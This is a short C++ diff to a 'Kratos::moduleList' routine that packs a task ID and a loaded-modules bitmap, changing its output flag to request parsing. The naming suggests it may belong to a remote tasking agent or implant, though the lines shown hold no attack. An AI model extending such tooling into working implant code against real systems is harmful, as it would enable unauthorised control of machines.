@@ -74,7 +74,8 @@ void Kratos::moduleList() {
 	packager->Pack4(TaskID);
 
 	auto bits = modules->GetLoadedModulesBitMap();
-	packager->Pack4(OUTPUT_NO_PARSE);
+	packager->Pack4(OUTPUT_NEEDS_PARSE);
+	packager->Pack4(PARSE_MODULE_BITS);
 	packager->Pack8(bits);
 }
 
